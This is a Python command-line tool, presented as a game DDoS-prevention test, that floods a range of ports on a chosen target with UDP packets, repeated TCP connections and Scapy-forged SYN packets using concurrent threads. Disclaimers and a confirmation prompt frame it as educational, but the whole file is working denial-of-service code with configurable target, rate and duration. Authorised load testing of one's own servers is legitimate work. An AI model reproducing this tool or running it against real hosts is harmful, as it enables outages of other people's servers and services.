#!/usr/bin/env python3
"""
Port Flooding Test Script

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""

import socket
import threading
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import IP, TCP, RandShort, Raw, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

def flood_port_udp(target_ip, port, packet_size, duration, delay):
    """Send UDP traffic to a specific port on the target IP."""
    end_time = time.time() + duration
    packet = b"X" * packet_size  # Create a simple packet filled with "X"
    
    try:
        # Create a UDP socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packets_sent = 0
        print(f"Starting UDP traffic to {target_ip}:{port}")
        
        while time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, port))
                packets_sent += 1
                time.sleep(delay)  # Control the packet rate
            except Exception as e:
                print(f"Error sending to {port}: {e}")
                break
                
        print(f"Completed sending {packets_sent} UDP packets to {target_ip}:{port}")
        
    except Exception as e:
        print(f"Error creating socket for {port}: {e}")
    finally:
        sock.close()

def flood_port_tcp(target_ip, port, packet_size, duration, delay):
    """Send TCP traffic to a specific port."""
    end_time = time.time() + duration
    packet = b"X" * packet_size
    
    print(f"Starting TCP traffic to {target_ip}:{port}")
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            # Create a new TCP socket for each connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Set timeout for connection attempts
            sock.connect((target_ip, port))
            sock.send(packet)
            packets_sent += 1
            sock.close()
            time.sleep(delay)
        except Exception as e:
            # Silently handle connection errors
            pass
            
    print(f"Completed sending {packets_sent} TCP packets to {target_ip}:{port}")

def syn_flood(target_ip, port, packet_size, duration, delay):
    """Send SYN packets without completing handshake."""
    if not SCAPY_AVAILABLE:
        print("Scapy is not installed. SYN flooding requires: pip install scapy")
        return
        
    end_time = time.time() + duration
    packets_sent = 0
    
    # Forge IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw = Raw(b"X"*packet_size)  # Add payload
    packet = ip / tcp / raw
    
    print(f"Starting SYN flood to {target_ip}:{port}")
    
    try:
        while time.time() < end_time:
            send(packet, verbose=0)
            packets_sent += 1
            time.sleep(delay)
    except Exception as e:
        print(f"Error during SYN flood to {port}: {e}")
    
    print(f"Completed sending {packets_sent} SYN packets to {target_ip}:{port}")

def main():
    parser = argparse.ArgumentParser(
        description="Game port flood testing tool",
        epilog="EDUCATIONAL USE ONLY: Test only on your own systems."
    )
    
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port-start", type=int, default=6520, help="Starting port (default: 6520)")
    parser.add_argument("--port-end", type=int, default=6540, help="Ending port (default: 6540)")
    parser.add_argument("--packet-size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
    parser.add_argument("--mode", choices=["udp", "tcp", "syn", "all"], default="udp", 
                        help="Flooding mode: udp, tcp, syn, or all (default: udp)")
    
    args = parser.parse_args()
    
    if args.port_start > args.port_end:
        parser.error("port-start must be less than or equal to port-end")
    
    if args.mode == "syn" and not SCAPY_AVAILABLE:
        print("\nWARNING: Scapy is not installed. SYN flooding requires: pip install scapy")
        return
        
    # Print warning and confirmation
    print("\n" + "="*80)
    print("WARNING: This script generates network traffic for testing purposes only.")
    print("It should ONLY be used on systems you own or have permission to test.")
    print("="*80 + "\n")
    
    confirm = input("Do you want to continue? (y/n): ").lower()
    if confirm != 'y':
        print("Test aborted.")
        return
    
    print(f"\nStarting {args.mode.upper()} traffic test to {args.target} ports {args.port_start}-{args.port_end}")
    print(f"Packet size: {args.packet_size} bytes, Duration: {args.duration} seconds")
    print(f"Using {args.threads} concurrent threads with {args.delay}s delay between packets\n")
    
    ports = list(range(args.port_start, args.port_end + 1))
    
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for port in ports:
                if args.mode in ["udp", "all"]:
                    executor.submit(
                        flood_port_udp, 
                        args.target, 
                        port, 
                        args.packet_size, 
                        args.duration, 
                        args.delay
                    )
                
                if args.mode in ["tcp", "all"]:
                    executor.submit(
                        flood_port_tcp, 
                        args.target, 
                        port, 
                        args.packet_size, 
                        args.duration, 
                        args.delay
                    )
                    
                if args.mode in ["syn", "all"] and SCAPY_AVAILABLE:
                    executor.submit(
                        syn_flood,
                        args.target,
                        port,
                        args.packet_size,
                        args.duration,
                        args.delay
                    )
        
        print("\nTraffic test completed for all ports.")
        
    except KeyboardInterrupt:
        print("\nTest interrupted by user. Stopping...")
    
if __name__ == "__main__":
    main()